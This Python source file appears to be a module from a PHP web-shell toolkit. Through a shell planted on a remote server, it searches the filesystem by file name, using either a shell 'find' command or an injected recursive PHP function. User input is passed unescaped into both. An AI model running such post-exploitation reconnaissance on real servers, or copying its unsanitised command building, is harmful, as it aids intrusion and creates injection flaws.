'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException

classname = 'Name'
    
class Name(Module):
    '''Find files with matching name 
    (e=equal, ei= equal case insensitive , c= contains, ci= contains case insensitive)
    :find.name e|ei|c|ci <string> <start path> 
    '''
    
    php_method = '''
@swp('%s','%s','%s');
function ckdir($df, $f) { return ($f!='.')&&($f!='..')&&@is_dir($df); }
function match($df, $f, $s, $m) { return (($m=='e')&&$f==$s)||(($m=='c')&&preg_match("/".$s."/",$f))||(($m=='ei')&&strcasecmp($s,$f)==0)||(($m=='ci')&&preg_match("/".$s."/i",$f)); }
function swp($d, $m, $s){
            $h = @opendir($d);
            while ($f = @readdir($h)) {
                    $df=$d.'/'.$f;
                    if(($f!='.')&&($f!='..')&&@match($df,$f,$s,$m)) print($df."\\n");
                    if(@ckdir($df,$f)) @swp($df, $m, $s);
            }
            @closedir($h);
}

?>
'''
    
    sh_method = "find %s %s %s 2>/dev/null"
    
    vectors = {
               "shell.sh" : {
                             'find' : sh_method
                },
               
               "shell.php" : {
              "php_recursive_find" : php_method
                              }
          }
    
    visible = True
    
    def __init__(self, modhandler, url, password):
        
        Module.__init__(self, modhandler, url, password)
        

    def __prepare_vector(self,interpreter, mod, string, path):
        
        
        if not mod in ('e', 'ei', 'c', 'ci'):
            raise ModuleException(self.name,  "Find name failed. Use e|ei|c|ci as parameter.")
        
        str_mod = mod
        str_string = string
        
        if interpreter == 'shell.sh':

            if mod == 'e' or mod == 'c':
                str_mod = '-name' 
            elif mod == 'ei' or mod == 'ci':
                str_mod = '-iname'
                
            if mod == 'c' or mod == 'ci':
                str_string = '\'*' + string + '*\''

            
        return (path, str_mod, str_string)


    def __execute_payload(self, interpreter, vector, mod, string, path):
        
        response = None
        payload = self.vectors[interpreter][vector] % self.__prepare_vector(interpreter, mod, string, path)
        print "[find.name] Finding by name using method '%s'" % (vector)  
                  
        if interpreter == 'shell.sh':
            response = self.modhandler.load(interpreter).run(payload, False)
        elif interpreter == 'shell.php':
            response = self.modhandler.load(interpreter).run(payload)
            
        return response

    def run(self, mod, string, path):
        
        interpreter, vector = self._get_default_vector()
        if interpreter and vector:
            return self.__execute_payload(interpreter, vector, mod, string, path)
        
        for interpreter in self.vectors:
            if interpreter in self.modhandler.loaded_shells:
                for vector in self.vectors[interpreter]:
                    response = self.__execute_payload(interpreter, vector, mod, string, path)
                    if response:
                        return response
                    
        raise ModuleException(self.name,  "No file found.")
            

        

    
    
    